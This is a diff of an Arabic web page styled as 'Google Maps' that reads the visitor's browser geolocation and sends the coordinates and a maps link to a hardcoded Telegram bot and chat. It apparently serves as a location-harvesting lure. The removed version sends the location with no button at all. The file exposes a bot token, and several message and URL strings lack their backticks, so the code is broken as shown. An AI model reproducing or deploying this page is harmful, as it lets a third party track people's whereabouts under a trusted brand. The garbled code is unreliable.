@@ -1,43 +1,97 @@
-<script>
-function getlocation() {
-    if (navigator.geolocation) {
-        console.log("طلب تحديد الموقع...");  
-        navigator.geolocation.getCurrentPosition(sendLocation, showError);
-    } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
-    }
-}
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خرائط Google - مشاركة الموقع</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        #map {
+            height: 90vh;
+            width: 100%;
+        }
+        #sendLocation {
+            width: 100%;
+            padding: 15px;
+            background-color: #4285F4;
+            color: white;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+        }
+        #sendLocation:hover {
+            background-color: #357AE8;
+        }
+    </style>
+</head>
+<body>
 
-function sendLocation(position) {
-    let latitude = position.coords.latitude;
-    let longitude = position.coords.longitude;
-    
-    let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";  
-    let chatId = "7326032837";  
+    <div id="map"></div>
+    <button id="sendLocation">📍 إرسال موقعي إلى تيليجرام</button>
 
-    let message = 📍 موقع جديد تم استلامه:\n\n🌍 الإحداثيات:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\n🔗 رابط Google Maps:\nhttps://www.google.com/maps?q=${latitude},${longitude};
+    <script>
+        let map, marker, latitude, longitude;
 
-    let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+        function initMap() {
+            map = new google.maps.Map(document.getElementById("map"), {
+                center: { lat: 31.5, lng: 44.4 }, // مركز افتراضي بالعراق
+                zoom: 15
+            });
 
-    console.log("إرسال الطلب إلى تيليجرام:", url);
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
 
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            console.log("الرد من API تيليجرام:", data);
-            if (data.ok) {
-                alert("تم إرسال الموقع بنجاح!");
+                    let pos = { lat: latitude, lng: longitude };
+                    map.setCenter(pos);
+
+                    marker = new google.maps.Marker({
+                        position: pos,
+                        map: map,
+                        title: "موقعك الحالي"
+                    });
+                }, () => {
+                    alert("لم يتم السماح بالوصول إلى الموقع!");
+                });
             } else {
-                alert("حدث خطأ أثناء الإرسال.");
+                alert("المتصفح لا يدعم GPS!");
             }
-        })
-        .catch(error => {
-            console.error("خطأ في الاتصال:", error);
-            alert("حدث خطأ في الاتصال بالبوت.");
-        });
-}
+        }
 
-function showError(error) {
-    alert("تعذر الحصول على الموقع: " + error.message);
-}
-</script>
+        document.getElementById("sendLocation").addEventListener("click", () => {
+            if (!latitude || !longitude) {
+                alert("الموقع غير متاح بعد!");
+                return;
+            }
+
+            let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";  
+            let chatId = "7326032837";  
+
+            let message = 📍 موقع جديد تم استلامه:\n\n🌍 الإحداثيات:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\n🔗 رابط Google Maps:\nhttps://www.google.com/maps?q=${latitude},${longitude};
+
+            let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال الموقع بنجاح!");
+                    } else {
+                        alert("حدث خطأ أثناء الإرسال.");
+                    }
+                })
+                .catch(error => alert("خطأ في الاتصال: " + error));
+        });
+
+    </script>
+    
+    <!-- استبدل YOUR_GOOGLE_MAPS_API_KEY بمفتاح API الخاص بك -->
+    <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&callback=initMap"></script>
+
+</body>
+</html>
